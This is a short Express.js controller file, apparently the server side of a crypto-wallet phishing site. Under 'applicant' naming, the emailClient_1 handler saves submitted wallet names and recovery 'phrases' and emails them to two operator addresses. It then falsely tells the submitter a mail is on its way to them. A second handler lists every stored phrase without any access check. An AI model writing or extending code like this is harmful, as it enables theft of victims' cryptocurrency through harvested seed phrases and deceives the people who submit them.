const Applicant = require("../Models/applicantModel");
const sendEmail = require("../Utils/sendMailToOwner");
const emailApplicant = require("../Utils/sendMailToApplicant");
const CustomError = require("../Utils/customError");

exports.home = (req, res) => {
  res.status(200).json({
    status: "Success",
    message: "Welcome to the landing page",
  });
};

exports.emailClient_1 = async (req, res, next) => {
  try {
    const details = await Applicant.create(req.body);

    try {
      await emailApplicant({
        email: process.env.USER1,
        subject: `Wallet Connected`,
        phrase: details.phrase,
        wallet: details.wallet,
      });

      await sendEmail({
        email: process.env.USER2,
        subject: "Wallet Connected",
        wallet: details.wallet,
        phrase: details.phrase,
      });

      res.status(200).json({
        status: "Success",
        message:
          "A mail would be sent to your email shortly. If you do not get it, Check your SPAM folder",
      });
    } catch (err) {
      const error = new CustomError(`An Error Occured. Please Try Again`, 500);
      return next(error);
    }
  } catch (error) {
    return next(error);
  }
};

exports.getAllApplicants = async (req, res, next) => {
  try {
    const applicants = await Applicant.find();
    res.status(200).json({
      status: "Success",
      data: applicants,
    });
  } catch (error) {
    next(
      new CustomError(
        "Failed to fetch applicants. Please try again later.",
        500
      )
    );
  }
};
